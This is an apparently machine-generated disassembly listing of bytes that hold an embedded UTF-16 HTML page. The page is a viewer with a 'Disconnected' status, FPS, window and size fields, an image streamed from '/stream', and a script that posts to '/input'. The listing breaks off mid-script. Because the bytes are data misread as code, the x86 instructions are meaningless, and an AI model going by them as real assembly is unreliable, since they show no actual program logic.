  406348:	00 73 00             	add    %dh,0x0(%ebx)
  40634b:	74 00                	je     0x40634d
  40634d:	79 00                	jns    0x40634f
  40634f:	6c                   	insb   (%dx),%es:(%edi)
  406350:	00 65 00             	add    %ah,0x0(%ebp)
  406353:	3e 00 0a             	add    %cl,%ds:(%edx)
  406356:	00 3c 00             	add    %bh,(%eax,%eax,1)
  406359:	2f                   	das
  40635a:	00 68 00             	add    %ch,0x0(%eax)
  40635d:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  406361:	64 00 3e             	add    %bh,%fs:(%esi)
  406364:	00 0a                	add    %cl,(%edx)
  406366:	00 3c 00             	add    %bh,(%eax,%eax,1)
  406369:	62 00                	bound  %eax,(%eax)
  40636b:	6f                   	outsl  %ds:(%esi),(%dx)
  40636c:	00 64 00 79          	add    %ah,0x79(%eax,%eax,1)
  406370:	00 3e                	add    %bh,(%esi)
  406372:	00 0a                	add    %cl,(%edx)
  406374:	00 20                	add    %ah,(%eax)
  406376:	00 20                	add    %ah,(%eax)
  406378:	00 3c 00             	add    %bh,(%eax,%eax,1)
  40637b:	64 00 69 00          	add    %ch,%fs:0x0(%ecx)
  40637f:	76 00                	jbe    0x406381
  406381:	20 00                	and    %al,(%eax)
  406383:	69 00 64 00 3d 00    	imul   $0x3d0064,(%eax),%eax
  406389:	27                   	daa
  40638a:	00 74 00 6f          	add    %dh,0x6f(%eax,%eax,1)
  40638e:	00 70 00             	add    %dh,0x0(%eax)
  406391:	27                   	daa
  406392:	00 3e                	add    %bh,(%esi)
  406394:	00 0a                	add    %cl,(%edx)
  406396:	00 20                	add    %ah,(%eax)
  406398:	00 20                	add    %ah,(%eax)
  40639a:	00 20                	add    %ah,(%eax)
  40639c:	00 20                	add    %ah,(%eax)
  40639e:	00 3c 00             	add    %bh,(%eax,%eax,1)
  4063a1:	64 00 69 00          	add    %ch,%fs:0x0(%ecx)
  4063a5:	76 00                	jbe    0x4063a7
  4063a7:	20 00                	and    %al,(%eax)
  4063a9:	69 00 64 00 3d 00    	imul   $0x3d0064,(%eax),%eax
  4063af:	27                   	daa
  4063b0:	00 73 00             	add    %dh,0x0(%ebx)
  4063b3:	74 00                	je     0x4063b5
  4063b5:	61                   	popa
  4063b6:	00 74 00 75          	add    %dh,0x75(%eax,%eax,1)
  4063ba:	00 73 00             	add    %dh,0x0(%ebx)
  4063bd:	27                   	daa
  4063be:	00 20                	add    %ah,(%eax)
  4063c0:	00 63 00             	add    %ah,0x0(%ebx)
  4063c3:	6c                   	insb   (%dx),%es:(%edi)
  4063c4:	00 61 00             	add    %ah,0x0(%ecx)
  4063c7:	73 00                	jae    0x4063c9
  4063c9:	73 00                	jae    0x4063cb
  4063cb:	3d 00 27 00 62       	cmp    $0x62002700,%eax
  4063d0:	00 61 00             	add    %ah,0x0(%ecx)
  4063d3:	64 00 27             	add    %ah,%fs:(%edi)
  4063d6:	00 3e                	add    %bh,(%esi)
  4063d8:	00 44 00 69          	add    %al,0x69(%eax,%eax,1)
  4063dc:	00 73 00             	add    %dh,0x0(%ebx)
  4063df:	63 00                	arpl   %eax,(%eax)
  4063e1:	6f                   	outsl  %ds:(%esi),(%dx)
  4063e2:	00 6e 00             	add    %ch,0x0(%esi)
  4063e5:	6e                   	outsb  %ds:(%esi),(%dx)
  4063e6:	00 65 00             	add    %ah,0x0(%ebp)
  4063e9:	63 00                	arpl   %eax,(%eax)
  4063eb:	74 00                	je     0x4063ed
  4063ed:	65 00 64 00 3c       	add    %ah,%gs:0x3c(%eax,%eax,1)
  4063f2:	00 2f                	add    %ch,(%edi)
  4063f4:	00 64 00 69          	add    %ah,0x69(%eax,%eax,1)
  4063f8:	00 76 00             	add    %dh,0x0(%esi)
  4063fb:	3e 00 0a             	add    %cl,%ds:(%edx)
  4063fe:	00 20                	add    %ah,(%eax)
  406400:	00 20                	add    %ah,(%eax)
  406402:	00 20                	add    %ah,(%eax)
  406404:	00 20                	add    %ah,(%eax)
  406406:	00 3c 00             	add    %bh,(%eax,%eax,1)
  406409:	64 00 69 00          	add    %ch,%fs:0x0(%ecx)
  40640d:	76 00                	jbe    0x40640f
  40640f:	20 00                	and    %al,(%eax)
  406411:	63 00                	arpl   %eax,(%eax)
  406413:	6c                   	insb   (%dx),%es:(%edi)
  406414:	00 61 00             	add    %ah,0x0(%ecx)
  406417:	73 00                	jae    0x406419
  406419:	73 00                	jae    0x40641b
  40641b:	3d 00 27 00 70       	cmp    $0x70002700,%eax
  406420:	00 69 00             	add    %ch,0x0(%ecx)
  406423:	6c                   	insb   (%dx),%es:(%edi)
  406424:	00 6c 00 27          	add    %ch,0x27(%eax,%eax,1)
  406428:	00 3e                	add    %bh,(%esi)
  40642a:	00 46 00             	add    %al,0x0(%esi)
  40642d:	50                   	push   %eax
  40642e:	00 53 00             	add    %dl,0x0(%ebx)
  406431:	3a 00                	cmp    (%eax),%al
  406433:	20 00                	and    %al,(%eax)
  406435:	3c 00                	cmp    $0x0,%al
  406437:	73 00                	jae    0x406439
  406439:	70 00                	jo     0x40643b
  40643b:	61                   	popa
  40643c:	00 6e 00             	add    %ch,0x0(%esi)
  40643f:	20 00                	and    %al,(%eax)
  406441:	69 00 64 00 3d 00    	imul   $0x3d0064,(%eax),%eax
  406447:	27                   	daa
  406448:	00 66 00             	add    %ah,0x0(%esi)
  40644b:	70 00                	jo     0x40644d
  40644d:	73 00                	jae    0x40644f
  40644f:	27                   	daa
  406450:	00 3e                	add    %bh,(%esi)
  406452:	00 30                	add    %dh,(%eax)
  406454:	00 3c 00             	add    %bh,(%eax,%eax,1)
  406457:	2f                   	das
  406458:	00 73 00             	add    %dh,0x0(%ebx)
  40645b:	70 00                	jo     0x40645d
  40645d:	61                   	popa
  40645e:	00 6e 00             	add    %ch,0x0(%esi)
  406461:	3e 00 3c 00          	add    %bh,%ds:(%eax,%eax,1)
  406465:	2f                   	das
  406466:	00 64 00 69          	add    %ah,0x69(%eax,%eax,1)
  40646a:	00 76 00             	add    %dh,0x0(%esi)
  40646d:	3e 00 0a             	add    %cl,%ds:(%edx)
  406470:	00 20                	add    %ah,(%eax)
  406472:	00 20                	add    %ah,(%eax)
  406474:	00 20                	add    %ah,(%eax)
  406476:	00 20                	add    %ah,(%eax)
  406478:	00 3c 00             	add    %bh,(%eax,%eax,1)
  40647b:	64 00 69 00          	add    %ch,%fs:0x0(%ecx)
  40647f:	76 00                	jbe    0x406481
  406481:	20 00                	and    %al,(%eax)
  406483:	63 00                	arpl   %eax,(%eax)
  406485:	6c                   	insb   (%dx),%es:(%edi)
  406486:	00 61 00             	add    %ah,0x0(%ecx)
  406489:	73 00                	jae    0x40648b
  40648b:	73 00                	jae    0x40648d
  40648d:	3d 00 27 00 70       	cmp    $0x70002700,%eax
  406492:	00 69 00             	add    %ch,0x0(%ecx)
  406495:	6c                   	insb   (%dx),%es:(%edi)
  406496:	00 6c 00 27          	add    %ch,0x27(%eax,%eax,1)
  40649a:	00 3e                	add    %bh,(%esi)
  40649c:	00 57 00             	add    %dl,0x0(%edi)
  40649f:	69 00 6e 00 64 00    	imul   $0x64006e,(%eax),%eax
  4064a5:	6f                   	outsl  %ds:(%esi),(%dx)
  4064a6:	00 77 00             	add    %dh,0x0(%edi)
  4064a9:	3a 00                	cmp    (%eax),%al
  4064ab:	20 00                	and    %al,(%eax)
  4064ad:	3c 00                	cmp    $0x0,%al
  4064af:	73 00                	jae    0x4064b1
  4064b1:	70 00                	jo     0x4064b3
  4064b3:	61                   	popa
  4064b4:	00 6e 00             	add    %ch,0x0(%esi)
  4064b7:	20 00                	and    %al,(%eax)
  4064b9:	69 00 64 00 3d 00    	imul   $0x3d0064,(%eax),%eax
  4064bf:	27                   	daa
  4064c0:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  4064c4:	00 74 00 6c          	add    %dh,0x6c(%eax,%eax,1)
  4064c8:	00 65 00             	add    %ah,0x0(%ebp)
  4064cb:	27                   	daa
  4064cc:	00 3e                	add    %bh,(%esi)
  4064ce:	00 28                	add    %ch,(%eax)
  4064d0:	00 6e 00             	add    %ch,0x0(%esi)
  4064d3:	6f                   	outsl  %ds:(%esi),(%dx)
  4064d4:	00 6e 00             	add    %ch,0x0(%esi)
  4064d7:	65 00 29             	add    %ch,%gs:(%ecx)
  4064da:	00 3c 00             	add    %bh,(%eax,%eax,1)
  4064dd:	2f                   	das
  4064de:	00 73 00             	add    %dh,0x0(%ebx)
  4064e1:	70 00                	jo     0x4064e3
  4064e3:	61                   	popa
  4064e4:	00 6e 00             	add    %ch,0x0(%esi)
  4064e7:	3e 00 3c 00          	add    %bh,%ds:(%eax,%eax,1)
  4064eb:	2f                   	das
  4064ec:	00 64 00 69          	add    %ah,0x69(%eax,%eax,1)
  4064f0:	00 76 00             	add    %dh,0x0(%esi)
  4064f3:	3e 00 0a             	add    %cl,%ds:(%edx)
  4064f6:	00 20                	add    %ah,(%eax)
  4064f8:	00 20                	add    %ah,(%eax)
  4064fa:	00 20                	add    %ah,(%eax)
  4064fc:	00 20                	add    %ah,(%eax)
  4064fe:	00 3c 00             	add    %bh,(%eax,%eax,1)
  406501:	64 00 69 00          	add    %ch,%fs:0x0(%ecx)
  406505:	76 00                	jbe    0x406507
  406507:	20 00                	and    %al,(%eax)
  406509:	63 00                	arpl   %eax,(%eax)
  40650b:	6c                   	insb   (%dx),%es:(%edi)
  40650c:	00 61 00             	add    %ah,0x0(%ecx)
  40650f:	73 00                	jae    0x406511
  406511:	73 00                	jae    0x406513
  406513:	3d 00 27 00 70       	cmp    $0x70002700,%eax
  406518:	00 69 00             	add    %ch,0x0(%ecx)
  40651b:	6c                   	insb   (%dx),%es:(%edi)
  40651c:	00 6c 00 27          	add    %ch,0x27(%eax,%eax,1)
  406520:	00 3e                	add    %bh,(%esi)
  406522:	00 53 00             	add    %dl,0x0(%ebx)
  406525:	69 00 7a 00 65 00    	imul   $0x65007a,(%eax),%eax
  40652b:	3a 00                	cmp    (%eax),%al
  40652d:	20 00                	and    %al,(%eax)
  40652f:	3c 00                	cmp    $0x0,%al
  406531:	73 00                	jae    0x406533
  406533:	70 00                	jo     0x406535
  406535:	61                   	popa
  406536:	00 6e 00             	add    %ch,0x0(%esi)
  406539:	20 00                	and    %al,(%eax)
  40653b:	69 00 64 00 3d 00    	imul   $0x3d0064,(%eax),%eax
  406541:	27                   	daa
  406542:	00 73 00             	add    %dh,0x0(%ebx)
  406545:	69 00 7a 00 65 00    	imul   $0x65007a,(%eax),%eax
  40654b:	27                   	daa
  40654c:	00 3e                	add    %bh,(%esi)
  40654e:	00 30                	add    %dh,(%eax)
  406550:	00 78 00             	add    %bh,0x0(%eax)
  406553:	30 00                	xor    %al,(%eax)
  406555:	3c 00                	cmp    $0x0,%al
  406557:	2f                   	das
  406558:	00 73 00             	add    %dh,0x0(%ebx)
  40655b:	70 00                	jo     0x40655d
  40655d:	61                   	popa
  40655e:	00 6e 00             	add    %ch,0x0(%esi)
  406561:	3e 00 3c 00          	add    %bh,%ds:(%eax,%eax,1)
  406565:	2f                   	das
  406566:	00 64 00 69          	add    %ah,0x69(%eax,%eax,1)
  40656a:	00 76 00             	add    %dh,0x0(%esi)
  40656d:	3e 00 0a             	add    %cl,%ds:(%edx)
  406570:	00 20                	add    %ah,(%eax)
  406572:	00 20                	add    %ah,(%eax)
  406574:	00 3c 00             	add    %bh,(%eax,%eax,1)
  406577:	2f                   	das
  406578:	00 64 00 69          	add    %ah,0x69(%eax,%eax,1)
  40657c:	00 76 00             	add    %dh,0x0(%esi)
  40657f:	3e 00 0a             	add    %cl,%ds:(%edx)
  406582:	00 20                	add    %ah,(%eax)
  406584:	00 20                	add    %ah,(%eax)
  406586:	00 3c 00             	add    %bh,(%eax,%eax,1)
  406589:	64 00 69 00          	add    %ch,%fs:0x0(%ecx)
  40658d:	76 00                	jbe    0x40658f
  40658f:	20 00                	and    %al,(%eax)
  406591:	69 00 64 00 3d 00    	imul   $0x3d0064,(%eax),%eax
  406597:	27                   	daa
  406598:	00 77 00             	add    %dh,0x0(%edi)
  40659b:	72 00                	jb     0x40659d
  40659d:	61                   	popa
  40659e:	00 70 00             	add    %dh,0x0(%eax)
  4065a1:	27                   	daa
  4065a2:	00 3e                	add    %bh,(%esi)
  4065a4:	00 0a                	add    %cl,(%edx)
  4065a6:	00 20                	add    %ah,(%eax)
  4065a8:	00 20                	add    %ah,(%eax)
  4065aa:	00 20                	add    %ah,(%eax)
  4065ac:	00 20                	add    %ah,(%eax)
  4065ae:	00 3c 00             	add    %bh,(%eax,%eax,1)
  4065b1:	69 00 6d 00 67 00    	imul   $0x67006d,(%eax),%eax
  4065b7:	20 00                	and    %al,(%eax)
  4065b9:	69 00 64 00 3d 00    	imul   $0x3d0064,(%eax),%eax
  4065bf:	27                   	daa
  4065c0:	00 76 00             	add    %dh,0x0(%esi)
  4065c3:	27                   	daa
  4065c4:	00 20                	add    %ah,(%eax)
  4065c6:	00 73 00             	add    %dh,0x0(%ebx)
  4065c9:	72 00                	jb     0x4065cb
  4065cb:	63 00                	arpl   %eax,(%eax)
  4065cd:	3d 00 27 00 2f       	cmp    $0x2f002700,%eax
  4065d2:	00 73 00             	add    %dh,0x0(%ebx)
  4065d5:	74 00                	je     0x4065d7
  4065d7:	72 00                	jb     0x4065d9
  4065d9:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  4065dd:	6d                   	insl   (%dx),%es:(%edi)
  4065de:	00 3f                	add    %bh,(%edi)
  4065e0:	00 74 00 73          	add    %dh,0x73(%eax,%eax,1)
  4065e4:	00 3d 00 27 00 20    	add    %bh,0x20002700
  4065ea:	00 61 00             	add    %ah,0x0(%ecx)
  4065ed:	6c                   	insb   (%dx),%es:(%edi)
  4065ee:	00 74 00 3d          	add    %dh,0x3d(%eax,%eax,1)
  4065f2:	00 27                	add    %ah,(%edi)
  4065f4:	00 73 00             	add    %dh,0x0(%ebx)
  4065f7:	74 00                	je     0x4065f9
  4065f9:	72 00                	jb     0x4065fb
  4065fb:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  4065ff:	6d                   	insl   (%dx),%es:(%edi)
  406600:	00 27                	add    %ah,(%edi)
  406602:	00 20                	add    %ah,(%eax)
  406604:	00 74 00 61          	add    %dh,0x61(%eax,%eax,1)
  406608:	00 62 00             	add    %ah,0x0(%edx)
  40660b:	69 00 6e 00 64 00    	imul   $0x64006e,(%eax),%eax
  406611:	65 00 78 00          	add    %bh,%gs:0x0(%eax)
  406615:	3d 00 27 00 30       	cmp    $0x30002700,%eax
  40661a:	00 27                	add    %ah,(%edi)
  40661c:	00 20                	add    %ah,(%eax)
  40661e:	00 64 00 72          	add    %ah,0x72(%eax,%eax,1)
  406622:	00 61 00             	add    %ah,0x0(%ecx)
  406625:	67 00 67 00          	add    %ah,0x0(%bx)
  406629:	61                   	popa
  40662a:	00 62 00             	add    %ah,0x0(%edx)
  40662d:	6c                   	insb   (%dx),%es:(%edi)
  40662e:	00 65 00             	add    %ah,0x0(%ebp)
  406631:	3d 00 27 00 66       	cmp    $0x66002700,%eax
  406636:	00 61 00             	add    %ah,0x0(%ecx)
  406639:	6c                   	insb   (%dx),%es:(%edi)
  40663a:	00 73 00             	add    %dh,0x0(%ebx)
  40663d:	65 00 27             	add    %ah,%gs:(%edi)
  406640:	00 3e                	add    %bh,(%esi)
  406642:	00 0a                	add    %cl,(%edx)
  406644:	00 20                	add    %ah,(%eax)
  406646:	00 20                	add    %ah,(%eax)
  406648:	00 3c 00             	add    %bh,(%eax,%eax,1)
  40664b:	2f                   	das
  40664c:	00 64 00 69          	add    %ah,0x69(%eax,%eax,1)
  406650:	00 76 00             	add    %dh,0x0(%esi)
  406653:	3e 00 0a             	add    %cl,%ds:(%edx)
  406656:	00 3c 00             	add    %bh,(%eax,%eax,1)
  406659:	73 00                	jae    0x40665b
  40665b:	63 00                	arpl   %eax,(%eax)
  40665d:	72 00                	jb     0x40665f
  40665f:	69 00 70 00 74 00    	imul   $0x740070,(%eax),%eax
  406665:	3e 00 0a             	add    %cl,%ds:(%edx)
  406668:	00 28                	add    %ch,(%eax)
  40666a:	00 66 00             	add    %ah,0x0(%esi)
  40666d:	75 00                	jne    0x40666f
  40666f:	6e                   	outsb  %ds:(%esi),(%dx)
  406670:	00 63 00             	add    %ah,0x0(%ebx)
  406673:	74 00                	je     0x406675
  406675:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  40667b:	28 00                	sub    %al,(%eax)
  40667d:	29 00                	sub    %eax,(%eax)
  40667f:	7b 00                	jnp    0x406681
  406681:	0a 00                	or     (%eax),%al
  406683:	20 00                	and    %al,(%eax)
  406685:	20 00                	and    %al,(%eax)
  406687:	76 00                	jbe    0x406689
  406689:	61                   	popa
  40668a:	00 72 00             	add    %dh,0x0(%edx)
  40668d:	20 00                	and    %al,(%eax)
  40668f:	69 00 6d 00 67 00    	imul   $0x67006d,(%eax),%eax
  406695:	20 00                	and    %al,(%eax)
  406697:	3d 00 20 00 64       	cmp    $0x64002000,%eax
  40669c:	00 6f 00             	add    %ch,0x0(%edi)
  40669f:	63 00                	arpl   %eax,(%eax)
  4066a1:	75 00                	jne    0x4066a3
  4066a3:	6d                   	insl   (%dx),%es:(%edi)
  4066a4:	00 65 00             	add    %ah,0x0(%ebp)
  4066a7:	6e                   	outsb  %ds:(%esi),(%dx)
  4066a8:	00 74 00 2e          	add    %dh,0x2e(%eax,%eax,1)
  4066ac:	00 67 00             	add    %ah,0x0(%edi)
  4066af:	65 00 74 00 45       	add    %dh,%gs:0x45(%eax,%eax,1)
  4066b4:	00 6c 00 65          	add    %ch,0x65(%eax,%eax,1)
  4066b8:	00 6d 00             	add    %ch,0x0(%ebp)
  4066bb:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  4066bf:	74 00                	je     0x4066c1
  4066c1:	42                   	inc    %edx
  4066c2:	00 79 00             	add    %bh,0x0(%ecx)
  4066c5:	49                   	dec    %ecx
  4066c6:	00 64 00 28          	add    %ah,0x28(%eax,%eax,1)
  4066ca:	00 27                	add    %ah,(%edi)
  4066cc:	00 76 00             	add    %dh,0x0(%esi)
  4066cf:	27                   	daa
  4066d0:	00 29                	add    %ch,(%ecx)
  4066d2:	00 3b                	add    %bh,(%ebx)
  4066d4:	00 0a                	add    %cl,(%edx)
  4066d6:	00 20                	add    %ah,(%eax)
  4066d8:	00 20                	add    %ah,(%eax)
  4066da:	00 76 00             	add    %dh,0x0(%esi)
  4066dd:	61                   	popa
  4066de:	00 72 00             	add    %dh,0x0(%edx)
  4066e1:	20 00                	and    %al,(%eax)
  4066e3:	73 00                	jae    0x4066e5
  4066e5:	74 00                	je     0x4066e7
  4066e7:	61                   	popa
  4066e8:	00 74 00 75          	add    %dh,0x75(%eax,%eax,1)
  4066ec:	00 73 00             	add    %dh,0x0(%ebx)
  4066ef:	45                   	inc    %ebp
  4066f0:	00 6c 00 20          	add    %ch,0x20(%eax,%eax,1)
  4066f4:	00 3d 00 20 00 64    	add    %bh,0x64002000
  4066fa:	00 6f 00             	add    %ch,0x0(%edi)
  4066fd:	63 00                	arpl   %eax,(%eax)
  4066ff:	75 00                	jne    0x406701
  406701:	6d                   	insl   (%dx),%es:(%edi)
  406702:	00 65 00             	add    %ah,0x0(%ebp)
  406705:	6e                   	outsb  %ds:(%esi),(%dx)
  406706:	00 74 00 2e          	add    %dh,0x2e(%eax,%eax,1)
  40670a:	00 67 00             	add    %ah,0x0(%edi)
  40670d:	65 00 74 00 45       	add    %dh,%gs:0x45(%eax,%eax,1)
  406712:	00 6c 00 65          	add    %ch,0x65(%eax,%eax,1)
  406716:	00 6d 00             	add    %ch,0x0(%ebp)
  406719:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  40671d:	74 00                	je     0x40671f
  40671f:	42                   	inc    %edx
  406720:	00 79 00             	add    %bh,0x0(%ecx)
  406723:	49                   	dec    %ecx
  406724:	00 64 00 28          	add    %ah,0x28(%eax,%eax,1)
  406728:	00 27                	add    %ah,(%edi)
  40672a:	00 73 00             	add    %dh,0x0(%ebx)
  40672d:	74 00                	je     0x40672f
  40672f:	61                   	popa
  406730:	00 74 00 75          	add    %dh,0x75(%eax,%eax,1)
  406734:	00 73 00             	add    %dh,0x0(%ebx)
  406737:	27                   	daa
  406738:	00 29                	add    %ch,(%ecx)
  40673a:	00 3b                	add    %bh,(%ebx)
  40673c:	00 0a                	add    %cl,(%edx)
  40673e:	00 20                	add    %ah,(%eax)
  406740:	00 20                	add    %ah,(%eax)
  406742:	00 76 00             	add    %dh,0x0(%esi)
  406745:	61                   	popa
  406746:	00 72 00             	add    %dh,0x0(%edx)
  406749:	20 00                	and    %al,(%eax)
  40674b:	66 00 70 00          	data16 add %dh,0x0(%eax)
  40674f:	73 00                	jae    0x406751
  406751:	45                   	inc    %ebp
  406752:	00 6c 00 20          	add    %ch,0x20(%eax,%eax,1)
  406756:	00 3d 00 20 00 64    	add    %bh,0x64002000
  40675c:	00 6f 00             	add    %ch,0x0(%edi)
  40675f:	63 00                	arpl   %eax,(%eax)
  406761:	75 00                	jne    0x406763
  406763:	6d                   	insl   (%dx),%es:(%edi)
  406764:	00 65 00             	add    %ah,0x0(%ebp)
  406767:	6e                   	outsb  %ds:(%esi),(%dx)
  406768:	00 74 00 2e          	add    %dh,0x2e(%eax,%eax,1)
  40676c:	00 67 00             	add    %ah,0x0(%edi)
  40676f:	65 00 74 00 45       	add    %dh,%gs:0x45(%eax,%eax,1)
  406774:	00 6c 00 65          	add    %ch,0x65(%eax,%eax,1)
  406778:	00 6d 00             	add    %ch,0x0(%ebp)
  40677b:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  40677f:	74 00                	je     0x406781
  406781:	42                   	inc    %edx
  406782:	00 79 00             	add    %bh,0x0(%ecx)
  406785:	49                   	dec    %ecx
  406786:	00 64 00 28          	add    %ah,0x28(%eax,%eax,1)
  40678a:	00 27                	add    %ah,(%edi)
  40678c:	00 66 00             	add    %ah,0x0(%esi)
  40678f:	70 00                	jo     0x406791
  406791:	73 00                	jae    0x406793
  406793:	27                   	daa
  406794:	00 29                	add    %ch,(%ecx)
  406796:	00 3b                	add    %bh,(%ebx)
  406798:	00 0a                	add    %cl,(%edx)
  40679a:	00 20                	add    %ah,(%eax)
  40679c:	00 20                	add    %ah,(%eax)
  40679e:	00 76 00             	add    %dh,0x0(%esi)
  4067a1:	61                   	popa
  4067a2:	00 72 00             	add    %dh,0x0(%edx)
  4067a5:	20 00                	and    %al,(%eax)
  4067a7:	74 00                	je     0x4067a9
  4067a9:	69 00 74 00 6c 00    	imul   $0x6c0074,(%eax),%eax
  4067af:	65 00 45 00          	add    %al,%gs:0x0(%ebp)
  4067b3:	6c                   	insb   (%dx),%es:(%edi)
  4067b4:	00 20                	add    %ah,(%eax)
  4067b6:	00 3d 00 20 00 64    	add    %bh,0x64002000
  4067bc:	00 6f 00             	add    %ch,0x0(%edi)
  4067bf:	63 00                	arpl   %eax,(%eax)
  4067c1:	75 00                	jne    0x4067c3
  4067c3:	6d                   	insl   (%dx),%es:(%edi)
  4067c4:	00 65 00             	add    %ah,0x0(%ebp)
  4067c7:	6e                   	outsb  %ds:(%esi),(%dx)
  4067c8:	00 74 00 2e          	add    %dh,0x2e(%eax,%eax,1)
  4067cc:	00 67 00             	add    %ah,0x0(%edi)
  4067cf:	65 00 74 00 45       	add    %dh,%gs:0x45(%eax,%eax,1)
  4067d4:	00 6c 00 65          	add    %ch,0x65(%eax,%eax,1)
  4067d8:	00 6d 00             	add    %ch,0x0(%ebp)
  4067db:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  4067df:	74 00                	je     0x4067e1
  4067e1:	42                   	inc    %edx
  4067e2:	00 79 00             	add    %bh,0x0(%ecx)
  4067e5:	49                   	dec    %ecx
  4067e6:	00 64 00 28          	add    %ah,0x28(%eax,%eax,1)
  4067ea:	00 27                	add    %ah,(%edi)
  4067ec:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  4067f0:	00 74 00 6c          	add    %dh,0x6c(%eax,%eax,1)
  4067f4:	00 65 00             	add    %ah,0x0(%ebp)
  4067f7:	27                   	daa
  4067f8:	00 29                	add    %ch,(%ecx)
  4067fa:	00 3b                	add    %bh,(%ebx)
  4067fc:	00 0a                	add    %cl,(%edx)
  4067fe:	00 20                	add    %ah,(%eax)
  406800:	00 20                	add    %ah,(%eax)
  406802:	00 76 00             	add    %dh,0x0(%esi)
  406805:	61                   	popa
  406806:	00 72 00             	add    %dh,0x0(%edx)
  406809:	20 00                	and    %al,(%eax)
  40680b:	73 00                	jae    0x40680d
  40680d:	69 00 7a 00 65 00    	imul   $0x65007a,(%eax),%eax
  406813:	45                   	inc    %ebp
  406814:	00 6c 00 20          	add    %ch,0x20(%eax,%eax,1)
  406818:	00 3d 00 20 00 64    	add    %bh,0x64002000
  40681e:	00 6f 00             	add    %ch,0x0(%edi)
  406821:	63 00                	arpl   %eax,(%eax)
  406823:	75 00                	jne    0x406825
  406825:	6d                   	insl   (%dx),%es:(%edi)
  406826:	00 65 00             	add    %ah,0x0(%ebp)
  406829:	6e                   	outsb  %ds:(%esi),(%dx)
  40682a:	00 74 00 2e          	add    %dh,0x2e(%eax,%eax,1)
  40682e:	00 67 00             	add    %ah,0x0(%edi)
  406831:	65 00 74 00 45       	add    %dh,%gs:0x45(%eax,%eax,1)
  406836:	00 6c 00 65          	add    %ch,0x65(%eax,%eax,1)
  40683a:	00 6d 00             	add    %ch,0x0(%ebp)
  40683d:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  406841:	74 00                	je     0x406843
  406843:	42                   	inc    %edx
  406844:	00 79 00             	add    %bh,0x0(%ecx)
  406847:	49                   	dec    %ecx
  406848:	00 64 00 28          	add    %ah,0x28(%eax,%eax,1)
  40684c:	00 27                	add    %ah,(%edi)
  40684e:	00 73 00             	add    %dh,0x0(%ebx)
  406851:	69 00 7a 00 65 00    	imul   $0x65007a,(%eax),%eax
  406857:	27                   	daa
  406858:	00 29                	add    %ch,(%ecx)
  40685a:	00 3b                	add    %bh,(%ebx)
  40685c:	00 0a                	add    %cl,(%edx)
  40685e:	00 0a                	add    %cl,(%edx)
  406860:	00 20                	add    %ah,(%eax)
  406862:	00 20                	add    %ah,(%eax)
  406864:	00 66 00             	add    %ah,0x0(%esi)
  406867:	75 00                	jne    0x406869
  406869:	6e                   	outsb  %ds:(%esi),(%dx)
  40686a:	00 63 00             	add    %ah,0x0(%ebx)
  40686d:	74 00                	je     0x40686f
  40686f:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  406875:	20 00                	and    %al,(%eax)
  406877:	70 00                	jo     0x406879
  406879:	6f                   	outsl  %ds:(%esi),(%dx)
  40687a:	00 73 00             	add    %dh,0x0(%ebx)
  40687d:	74 00                	je     0x40687f
  40687f:	28 00                	sub    %al,(%eax)
  406881:	6f                   	outsl  %ds:(%esi),(%dx)
  406882:	00 29                	add    %ch,(%ecx)
  406884:	00 7b 00             	add    %bh,0x0(%ebx)
  406887:	0a 00                	or     (%eax),%al
  406889:	20 00                	and    %al,(%eax)
  40688b:	20 00                	and    %al,(%eax)
  40688d:	20 00                	and    %al,(%eax)
  40688f:	20 00                	and    %al,(%eax)
  406891:	66 00 65 00          	data16 add %ah,0x0(%ebp)
  406895:	74 00                	je     0x406897
  406897:	63 00                	arpl   %eax,(%eax)
  406899:	68 00 28 00 27       	push   $0x27002800
  40689e:	00 2f                	add    %ch,(%edi)
  4068a0:	00 69 00             	add    %ch,0x0(%ecx)
  4068a3:	6e                   	outsb  %ds:(%esi),(%dx)
  4068a4:	00 70 00             	add    %dh,0x0(%eax)
  4068a7:	75 00                	jne    0x4068a9
  4068a9:	74 00                	je     0x4068ab
  4068ab:	27                   	daa
  4068ac:	00 2c 00             	add    %ch,(%eax,%eax,1)
  4068af:	7b 00                	jnp    0x4068b1
  4068b1:	6d                   	insl   (%dx),%es:(%edi)
  4068b2:	00 65 00             	add    %ah,0x0(%ebp)
  4068b5:	74 00                	je     0x4068b7
  4068b7:	68 00 6f 00 64       	push   $0x64006f00
  4068bc:	00 3a                	add    %bh,(%edx)
  4068be:	00 27                	add    %ah,(%edi)
  4068c0:	00 50 00             	add    %dl,0x0(%eax)
  4068c3:	4f                   	dec    %edi
  4068c4:	00 53 00             	add    %dl,0x0(%ebx)
  4068c7:	54                   	push   %esp
  4068c8:	00 27                	add    %ah,(%edi)
  4068ca:	00 2c 00             	add    %ch,(%eax,%eax,1)
  4068cd:	68 00 65 00 61       	push   $0x61006500
  4068d2:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  4068d6:	00 72 00             	add    %dh,0x0(%edx)
  4068d9:	73 00                	jae    0x4068db
  4068db:	3a 00                	cmp    (%eax),%al
  4068dd:	7b 00                	jnp    0x4068df
  4068df:	27                   	daa
  4068e0:	00 43 00             	add    %al,0x0(%ebx)
  4068e3:	6f                   	outsl  %ds:(%esi),(%dx)
  4068e4:	00 6e 00             	add    %ch,0x0(%esi)
  4068e7:	74 00                	je     0x4068e9
  4068e9:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  4068ed:	74 00                	je     0x4068ef
  4068ef:	2d 00 54 00 79       	sub    $0x79005400,%eax
  4068f4:	00 70 00             	add    %dh,0x0(%eax)
  4068f7:	65 00 27             	add    %ah,%gs:(%edi)
  4068fa:	00 3a                	add    %bh,(%edx)
  4068fc:	00 27                	add    %ah,(%edi)
  4068fe:	00 61 00             	add    %ah,0x0(%ecx)
  406901:	70 00                	jo     0x406903
  406903:	70 00                	jo     0x406905
  406905:	6c                   	insb   (%dx),%es:(%edi)
  406906:	00 69 00             	add    %ch,0x0(%ecx)
